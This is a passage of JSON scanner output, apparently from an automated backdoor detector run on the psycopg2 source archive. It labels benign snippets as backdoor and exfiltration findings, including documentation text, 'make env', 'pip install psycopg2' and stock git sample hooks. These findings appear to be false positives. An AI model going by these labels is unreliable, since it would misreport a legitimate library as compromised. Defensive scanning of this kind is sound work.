                      "markdown": "``~connection.poll()` method can be used to check for new messages without\nwasting resources.\n\nA simple application could poll the connection from time to time to check if\nsomething new has arrived. A better strategy is to use some I/O completion\nfunction such as :py:func:`~select.select` to sleep until awakened by the kernel when there is\nsome data to read on the connection, thereby using no CPU unless there is\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/advanced.rst"
                },
                "region": {
                  "startLine": 259,
                  "startColumn": 11,
                  "endLine": 259,
                  "endColumn": 17,
                  "snippet": {
                    "text": "\nBecause of the way sessions interact with notifications (see |NOTIFY|_\ndocumentation), you should keep the connection in `~connection.autocommit`\nmode if you wish to receive or send notifications in a timely manner.\n\n.. |LISTEN| replace:: :sql:`LISTEN`\n.. _LISTEN: https://www.postgresql.org/docs/current/static/sql-listen.html\n",
                    "rendered": {
                      "text": "\nBecause of the way sessions interact with notifications (see |NOTIFY|_\ndocumentation), you should keep the connection in `~connection.autocommit`\nmode if you wish to receive or send notifications in a timely manner.\n\n.. |LISTEN| replace:: :sql:`LISTEN`\n.. _LISTEN: https://www.postgresql.org/docs/current/static/sql-listen.html\n",
                      "markdown": "`\nBecause of the way sessions interact with notifications (see |NOTIFY|_\ndocumentation), you should keep the connection in `~connection.autocommit`\nmode if you wish to receive or send notifications in a timely manner.\n\n.. |LISTEN| replace:: :sql:`LISTEN`\n.. _LISTEN: https://www.postgresql.org/docs/current/static/sql-listen.html\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/Makefile"
                },
                "region": {
                  "startLine": 98,
                  "startColumn": 57,
                  "endLine": 98,
                  "endColumn": 61,
                  "snippet": {
                    "text": "doctest:\n\tPSYCOPG2_DSN=$(PSYCOPG2_DSN) \\\n\t$(SPHINXBUILD) -b doctest $(ALLSPHINXOPTS) $(BUILDDIR)/doctest\n\t@echo \"Testing of doctests in the sources finished, look at the \" \\\n\t      \"results in $(BUILDDIR)/doctest/output.txt.\"\n",
                    "rendered": {
                      "text": "doctest:\n\tPSYCOPG2_DSN=$(PSYCOPG2_DSN) \\\n\t$(SPHINXBUILD) -b doctest $(ALLSPHINXOPTS) $(BUILDDIR)/doctest\n\t@echo \"Testing of doctests in the sources finished, look at the \" \\\n\t      \"results in $(BUILDDIR)/doctest/output.txt.\"\n",
                      "markdown": "`doctest:\n\tPSYCOPG2_DSN=$(PSYCOPG2_DSN) \\\n\t$(SPHINXBUILD) -b doctest $(ALLSPHINXOPTS) $(BUILDDIR)/doctest\n\t@echo \"Testing of doctests in the sources finished, look at the \" \\\n\t      \"results in $(BUILDDIR)/doctest/output.txt.\"\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/README.rst"
                },
                "region": {
                  "startLine": 20,
                  "startColumn": 10,
                  "endLine": 20,
                  "endColumn": 16,
                  "snippet": {
                    "text": "\n    make\n\nYou should find the rendered documentation in the ``html`` directory.\n",
                    "rendered": {
                      "text": "\n    make\n\nYou should find the rendered documentation in the ``html`` directory.\n",
                      "markdown": "`\n    make\n\nYou should find the rendered documentation in the ``html`` directory.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/README.rst"
                },
                "region": {
                  "startLine": 14,
                  "startColumn": 8,
                  "endLine": 15,
                  "snippet": {
                    "text": "\nBuild the env once with::\n\n    make env\n\nThen you can build the documentation with::\n\n    make\n",
                    "rendered": {
                      "text": "\nBuild the env once with::\n\n    make env\n\nThen you can build the documentation with::\n\n    make\n",
                      "markdown": "`\nBuild the env once with::\n\n    make env\n\nThen you can build the documentation with::\n\n    make\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/README.rst"
                },
                "region": {
                  "startLine": 12,
                  "startColumn": 9,
                  "endLine": 12,
                  "endColumn": 14,
                  "snippet": {
                    "text": ".. _prerequisites: https://www.psycopg.org/docs/install.html#install-from-source\n.. _virtualenv: https://virtualenv.pypa.io/en/latest/\n\nBuild the env once with::\n\n    make env\n\n",
                    "rendered": {
                      "text": ".. _prerequisites: https://www.psycopg.org/docs/install.html#install-from-source\n.. _virtualenv: https://virtualenv.pypa.io/en/latest/\n\nBuild the env once with::\n\n    make env\n\n",
                      "markdown": "`.. _prerequisites: https://www.psycopg.org/docs/install.html#install-from-source\n.. _virtualenv: https://virtualenv.pypa.io/en/latest/\n\nBuild the env once with::\n\n    make env\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/README.rst"
                },
                "region": {
                  "startLine": 12,
                  "startColumn": 10,
                  "endLine": 12,
                  "endColumn": 17,
                  "snippet": {
                    "text": ".. _prerequisites: https://www.psycopg.org/docs/install.html#install-from-source\n.. _virtualenv: https://virtualenv.pypa.io/en/latest/\n\nBuild the env once with::\n\n    make env\n\n",
                    "rendered": {
                      "text": ".. _prerequisites: https://www.psycopg.org/docs/install.html#install-from-source\n.. _virtualenv: https://virtualenv.pypa.io/en/latest/\n\nBuild the env once with::\n\n    make env\n\n",
                      "markdown": "`.. _prerequisites: https://www.psycopg.org/docs/install.html#install-from-source\n.. _virtualenv: https://virtualenv.pypa.io/en/latest/\n\nBuild the env once with::\n\n    make env\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/README.rst"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 5,
                  "endLine": 66,
                  "endColumn": 10,
                  "snippet": {
                    "text": "You can also obtain a stand-alone package, not requiring a compiler or\nexternal libraries, by installing the `psycopg2-binary`_ package from PyPI::\n\n    $ pip install psycopg2-binary\n\nThe binary package is a practical choice for development and testing but in\nproduction it is advised to use the package built from sources.\n",
                    "rendered": {
                      "text": "You can also obtain a stand-alone package, not requiring a compiler or\nexternal libraries, by installing the `psycopg2-binary`_ package from PyPI::\n\n    $ pip install psycopg2-binary\n\nThe binary package is a practical choice for development and testing but in\nproduction it is advised to use the package built from sources.\n",
                      "markdown": "`You can also obtain a stand-alone package, not requiring a compiler or\nexternal libraries, by installing the `psycopg2-binary`_ package from PyPI::\n\n    $ pip install psycopg2-binary\n\nThe binary package is a practical choice for development and testing but in\nproduction it is advised to use the package built from sources.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/README.rst"
                },
                "region": {
                  "startLine": 56,
                  "startColumn": 5,
                  "endLine": 56,
                  "endColumn": 10,
                  "snippet": {
                    "text": "If prerequisites are met, you can install psycopg like any other Python\npackage, using ``pip`` to download it from PyPI_::\n\n    $ pip install psycopg2\n\nor using ``setup.py`` if you have downloaded the source package locally::\n\n",
                    "rendered": {
                      "text": "If prerequisites are met, you can install psycopg like any other Python\npackage, using ``pip`` to download it from PyPI_::\n\n    $ pip install psycopg2\n\nor using ``setup.py`` if you have downloaded the source package locally::\n\n",
                      "markdown": "`If prerequisites are met, you can install psycopg like any other Python\npackage, using ``pip`` to download it from PyPI_::\n\n    $ pip install psycopg2\n\nor using ``setup.py`` if you have downloaded the source package locally::\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/INSTALL"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 53,
                  "endLine": 4,
                  "snippet": {
                    "text": "Installation instructions are included in the docs.\n\nPlease check the 'doc/src/install.rst' file or online at\n<https://www.psycopg.org/docs/install.html>.\n",
                    "rendered": {
                      "text": "Installation instructions are included in the docs.\n\nPlease check the 'doc/src/install.rst' file or online at\n<https://www.psycopg.org/docs/install.html>.\n",
                      "markdown": "`Installation instructions are included in the docs.\n\nPlease check the 'doc/src/install.rst' file or online at\n<https://www.psycopg.org/docs/install.html>.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/post-update.sample"
                },
                "region": {
                  "startLine": 8,
                  "startColumn": 4,
                  "endLine": 8,
                  "endColumn": 9,
                  "snippet": {
                    "text": "#\n# To enable this hook, rename this file to \"post-update\".\n\nexec git update-server-info\n",
                    "rendered": {
                      "text": "#\n# To enable this hook, rename this file to \"post-update\".\n\nexec git update-server-info\n",
                      "markdown": "`#\n# To enable this hook, rename this file to \"post-update\".\n\nexec git update-server-info\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/post-update.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 17,
                  "endLine": 3,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/bin/sh\n#\n# An example hook script to prepare a packed repository for use over\n# dumb transports.\n#\n# To enable this hook, rename this file to \"post-update\".\n",
                    "rendered": {
                      "text": "#!/bin/sh\n#\n# An example hook script to prepare a packed repository for use over\n# dumb transports.\n#\n# To enable this hook, rename this file to \"post-update\".\n",
                      "markdown": "`#!/bin/sh\n#\n# An example hook script to prepare a packed repository for use over\n# dumb transports.\n#\n# To enable this hook, rename this file to \"post-update\".\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/pre-commit.sample"
                },
                "region": {
                  "startLine": 26,
                  "startColumn": 24,
                  "endLine": 26,
                  "endColumn": 28,
                  "snippet": {
                    "text": "\n# Cross platform projects tend to avoid non-ASCII filenames; prevent\n# them from being added to the repository. We exploit the fact that the\n# printable range starts at the space character and ends with tilde.\nif [ \"$allownonascii\" != \"true\" ] &&\n\t# Note that the use of brackets around a tr range is ok here, (it's\n\t# even required, for portability to Solaris 10's /usr/bin/tr), since\n",
                    "rendered": {
                      "text": "\n# Cross platform projects tend to avoid non-ASCII filenames; prevent\n# them from being added to the repository. We exploit the fact that the\n# printable range starts at the space character and ends with tilde.\nif [ \"$allownonascii\" != \"true\" ] &&\n\t# Note that the use of brackets around a tr range is ok here, (it's\n\t# even required, for portability to Solaris 10's /usr/bin/tr), since\n",
                      "markdown": "`\n# Cross platform projects tend to avoid non-ASCII filenames; prevent\n# them from being added to the repository. We exploit the fact that the\n# printable range starts at the space character and ends with tilde.\nif [ \"$allownonascii\" != \"true\" ] &&\n\t# Note that the use of brackets around a tr range is ok here, (it's\n\t# even required, for portability to Solaris 10's /usr/bin/tr), since\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/pre-commit.sample"
                },
                "region": {
                  "startLine": 49,
                  "startColumn": 4,
                  "endLine": 49,
                  "endColumn": 9,
                  "snippet": {
                    "text": "fi\n\n# If there are whitespace errors, print the offending file names and fail.\nexec git diff-index --check --cached $against --\n",
                    "rendered": {
                      "text": "fi\n\n# If there are whitespace errors, print the offending file names and fail.\nexec git diff-index --check --cached $against --\n",
                      "markdown": "`fi\n\n# If there are whitespace errors, print the offending file names and fail.\nexec git diff-index --check --cached $against --\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/pre-commit.sample"
                },
                "region": {
                  "startLine": 43,
                  "startColumn": 1,
                  "endLine": 43,
                  "endColumn": 6,
                  "snippet": {
                    "text": "\nIf you know what you are doing you can disable this check using:\n\n  git config hooks.allownonascii true\nEOF\n\texit 1\nfi\n",
                    "rendered": {
                      "text": "\nIf you know what you are doing you can disable this check using:\n\n  git config hooks.allownonascii true\nEOF\n\texit 1\nfi\n",
                      "markdown": "`\nIf you know what you are doing you can disable this check using:\n\n  git config hooks.allownonascii true\nEOF\n\texit 1\nfi\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/pre-commit.sample"
                },
                "region": {
                  "startLine": 34,
                  "endLine": 34,
                  "endColumn": 5,
                  "snippet": {
                    "text": "\ttest $(git diff --cached --name-only --diff-filter=A -z $against |\n\t  LC_ALL=C tr -d '[ -~]\\0' | wc -c) != 0\nthen\n\tcat <<\\EOF\nError: Attempt to add a non-ASCII file name.\n\nThis can cause problems if you want to work with people on other platforms.\n",
                    "rendered": {
                      "text": "\ttest $(git diff --cached --name-only --diff-filter=A -z $against |\n\t  LC_ALL=C tr -d '[ -~]\\0' | wc -c) != 0\nthen\n\tcat <<\\EOF\nError: Attempt to add a non-ASCII file name.\n\nThis can cause problems if you want to work with people on other platforms.\n",
                      "markdown": "`\ttest $(git diff --cached --name-only --diff-filter=A -z $against |\n\t  LC_ALL=C tr -d '[ -~]\\0' | wc -c) != 0\nthen\n\tcat <<\\EOF\nError: Attempt to add a non-ASCII file name.\n\nThis can cause problems if you want to work with people on other platforms.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/pre-commit.sample"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 11,
                  "endLine": 31,
                  "endColumn": 17,
                  "snippet": {
                    "text": "\t# Note that the use of brackets around a tr range is ok here, (it's\n\t# even required, for portability to Solaris 10's /usr/bin/tr), since\n\t# the square bracket bytes happen to fall in the designated range.\n\ttest $(git diff --cached --name-only --diff-filter=A -z $against |\n\t  LC_ALL=C tr -d '[ -~]\\0' | wc -c) != 0\nthen\n\tcat <<\\EOF\n",
                    "rendered": {
                      "text": "\t# Note that the use of brackets around a tr range is ok here, (it's\n\t# even required, for portability to Solaris 10's /usr/bin/tr), since\n\t# the square bracket bytes happen to fall in the designated range.\n\ttest $(git diff --cached --name-only --diff-filter=A -z $against |\n\t  LC_ALL=C tr -d '[ -~]\\0' | wc -c) != 0\nthen\n\tcat <<\\EOF\n",
                      "markdown": "`\t# Note that the use of brackets around a tr range is ok here, (it's\n\t# even required, for portability to Solaris 10's /usr/bin/tr), since\n\t# the square bracket bytes happen to fall in the designated range.\n\ttest $(git diff --cached --name-only --diff-filter=A -z $against |\n\t  LC_ALL=C tr -d '[ -~]\\0' | wc -c) != 0\nthen\n\tcat <<\\EOF\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/pre-commit.sample"
                },
                "region": {
                  "startLine": 14,
                  "startColumn": 18,
                  "endLine": 14,
                  "endColumn": 24,
                  "snippet": {
                    "text": "then\n\tagainst=HEAD\nelse\n\t# Initial commit: diff against an empty tree object\n\tagainst=$(git hash-object -t tree /dev/null)\nfi\n\n",
                    "rendered": {
                      "text": "then\n\tagainst=HEAD\nelse\n\t# Initial commit: diff against an empty tree object\n\tagainst=$(git hash-object -t tree /dev/null)\nfi\n\n",
                      "markdown": "`then\n\tagainst=HEAD\nelse\n\t# Initial commit: diff against an empty tree object\n\tagainst=$(git hash-object -t tree /dev/null)\nfi\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/pre-commit.sample"
                },
                "region": {
                  "startLine": 10,
                  "startColumn": 25,
                  "endLine": 10,
                  "endColumn": 31,
                  "snippet": {
                    "text": "#\n# To enable this hook, rename this file to \"pre-commit\".\n\nif git rev-parse --verify HEAD >/dev/null 2>&1\nthen\n\tagainst=HEAD\nelse\n",
                    "rendered": {
                      "text": "#\n# To enable this hook, rename this file to \"pre-commit\".\n\nif git rev-parse --verify HEAD >/dev/null 2>&1\nthen\n\tagainst=HEAD\nelse\n",
                      "markdown": "`#\n# To enable this hook, rename this file to \"pre-commit\".\n\nif git rev-parse --verify HEAD >/dev/null 2>&1\nthen\n\tagainst=HEAD\nelse\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/pre-commit.sample"
                },
                "region": {
                  "startLine": 10,
                  "startColumn": 2,
                  "endLine": 10,
                  "endColumn": 7,
                  "snippet": {
                    "text": "#\n# To enable this hook, rename this file to \"pre-commit\".\n\nif git rev-parse --verify HEAD >/dev/null 2>&1\nthen\n\tagainst=HEAD\nelse\n",
                    "rendered": {
                      "text": "#\n# To enable this hook, rename this file to \"pre-commit\".\n\nif git rev-parse --verify HEAD >/dev/null 2>&1\nthen\n\tagainst=HEAD\nelse\n",
                      "markdown": "`#\n# To enable this hook, rename this file to \"pre-commit\".\n\nif git rev-parse --verify HEAD >/dev/null 2>&1\nthen\n\tagainst=HEAD\nelse\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/pre-commit.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 17,
                  "endLine": 3,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/bin/sh\n#\n# An example hook script to verify what is about to be committed.\n# Called by \"git commit\" with no arguments.  The hook should\n# exit with non-zero status after issuing an appropriate message if\n# it wants to stop the commit.\n",
                    "rendered": {
                      "text": "#!/bin/sh\n#\n# An example hook script to verify what is about to be committed.\n# Called by \"git commit\" with no arguments.  The hook should\n# exit with non-zero status after issuing an appropriate message if\n# it wants to stop the commit.\n",
                      "markdown": "`#!/bin/sh\n#\n# An example hook script to verify what is about to be committed.\n# Called by \"git commit\" with no arguments.  The hook should\n# exit with non-zero status after issuing an appropriate message if\n# it wants to stop the commit.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/pre-rebase.sample"
                },
                "region": {
                  "startLine": 161,
                  "startColumn": 45,
                  "endLine": 161,
                  "endColumn": 49,
                  "snippet": {
                    "text": "\tgit rev-list ^master ^topic next\n\tgit rev-list ^master        next\n\n\tif these match, topic has not merged in next at all.\n\nTo compute (2):\n\n",
                    "rendered": {
                      "text": "\tgit rev-list ^master ^topic next\n\tgit rev-list ^master        next\n\n\tif these match, topic has not merged in next at all.\n\nTo compute (2):\n\n",
                      "markdown": "`\tgit rev-list ^master ^topic next\n\tgit rev-list ^master        next\n\n\tif these match, topic has not merged in next at all.\n\nTo compute (2):\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/pre-rebase.sample"
                },
                "region": {
                  "startLine": 151,
                  "startColumn": 29,
                  "endLine": 151,
                  "endColumn": 33,
                  "snippet": {
                    "text": " * B has finished.  It has been fully merged up to \"master\" and \"next\",\n   and is ready to be deleted.\n\n * C has not merged to \"next\" at all.\n\nWe would want to allow C to be rebased, refuse A, and encourage\nB to be deleted.\n",
                    "rendered": {
                      "text": " * B has finished.  It has been fully merged up to \"master\" and \"next\",\n   and is ready to be deleted.\n\n * C has not merged to \"next\" at all.\n\nWe would want to allow C to be rebased, refuse A, and encourage\nB to be deleted.\n",
                      "markdown": "` * B has finished.  It has been fully merged up to \"master\" and \"next\",\n   and is ready to be deleted.\n\n * C has not merged to \"next\" at all.\n\nWe would want to allow C to be rebased, refuse A, and encourage\nB to be deleted.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/pre-rebase.sample"
                },
                "region": {
                  "startLine": 131,
                  "startColumn": 10,
                  "endLine": 131,
                  "endColumn": 14,
                  "snippet": {
                    "text": "    fork the topic (perhaps with the same name) afresh from the\n    tip of \"master\".\n\nLet's look at this example:\n\n\t\t   o---o---o---o---o---o---o---o---o---o \"next\"\n\t\t  /       /           /           /\n",
                    "rendered": {
                      "text": "    fork the topic (perhaps with the same name) afresh from the\n    tip of \"master\".\n\nLet's look at this example:\n\n\t\t   o---o---o---o---o---o---o---o---o---o \"next\"\n\t\t  /       /           /           /\n",
                      "markdown": "`    fork the topic (perhaps with the same name) afresh from the\n    tip of \"master\".\n\nLet's look at this example:\n\n\t\t   o---o---o---o---o---o---o---o---o---o \"next\"\n\t\t  /       /           /           /\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/pre-rebase.sample"
                },
                "region": {
                  "startLine": 103,
                  "startColumn": 61,
                  "endLine": 104,
                  "snippet": {
                    "text": "\n * Once a topic branch is fully cooked and merged into \"master\",\n   it is deleted.  If you need to build on top of it to correct\n   earlier mistakes, a new topic branch is created by forking at\n   the tip of the \"master\".  This is not strictly necessary, but\n   it makes it easier to keep your history simple.\n\n * Whenever you need to test or publish your changes to topic\n",
                    "rendered": {
                      "text": "\n * Once a topic branch is fully cooked and merged into \"master\",\n   it is deleted.  If you need to build on top of it to correct\n   earlier mistakes, a new topic branch is created by forking at\n   the tip of the \"master\".  This is not strictly necessary, but\n   it makes it easier to keep your history simple.\n\n * Whenever you need to test or publish your changes to topic\n",
                      "markdown": "`\n * Once a topic branch is fully cooked and merged into \"master\",\n   it is deleted.  If you need to build on top of it to correct\n   earlier mistakes, a new topic branch is created by forking at\n   the tip of the \"master\".  This is not strictly necessary, but\n   it makes it easier to keep your history simple.\n\n * Whenever you need to test or publish your changes to topic\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/pre-rebase.sample"
                },
                "region": {
                  "startLine": 165,
                  "endLine": 165,
                  "endColumn": 5,
                  "snippet": {
                    "text": "\nTo compute (2):\n\n\tgit rev-list master..topic\n\n\tif this is empty, it is fully merged to \"master\".\n\n",
                    "rendered": {
